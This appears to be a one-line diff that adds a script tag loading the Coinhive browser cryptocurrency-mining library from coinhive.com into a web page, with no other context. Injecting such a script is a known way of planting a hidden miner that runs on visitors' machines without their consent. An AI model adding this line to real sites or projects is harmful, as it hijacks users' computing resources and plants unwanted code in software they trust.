@@ -1,0 +1,1 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
